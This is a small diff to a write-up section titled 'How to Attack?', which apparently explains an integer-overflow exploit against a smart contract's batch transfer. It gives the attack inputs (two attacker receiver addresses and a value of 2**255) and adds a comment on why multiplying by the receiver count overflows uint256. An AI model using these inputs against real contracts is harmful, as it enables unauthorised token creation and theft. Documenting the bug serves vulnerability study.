@@ -32,5 +32,8 @@ How to Attack?
 ```
 _receivers:  ["attackers_address","attackers_address"]
 _value:      57896044618658097711785492504343953926634992332820282019728792003956564819968
-// 2**255*2
+
+// due to uint256's max value is 2**256 (when >=2**256 will overflow),
+//and in this contract will multiply _receivers.length,
+//so attacker set 2 receiver address and set _value == 2**255
 ```
